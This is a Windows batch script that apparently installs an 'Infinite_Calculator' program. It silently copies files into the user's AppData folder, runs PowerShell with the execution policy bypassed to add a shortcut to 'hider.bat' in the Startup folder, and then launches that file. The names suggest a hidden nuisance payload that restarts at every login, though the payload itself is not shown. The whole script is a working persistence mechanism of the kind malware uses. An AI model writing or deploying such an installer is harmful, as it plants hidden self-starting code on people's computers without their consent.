@rem Start the script
@echo off

echo Copy the file to AppData\Infinite_Calculator
xcopy /s Code %AppData%\Infinite_Calculator /Y /I

echo.
echo Create Shortcut
set TARGET='%AppData%\Infinite_Calculator\hider.bat'
set SHORTCUT='%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\infinite_calculator.lnk'
set PWS=powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
%PWS% -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(%SHORTCUT%); $S.TargetPath = %TARGET%; $S.Save()"

"%APPDATA%\Infinite_Calculator\hider.bat"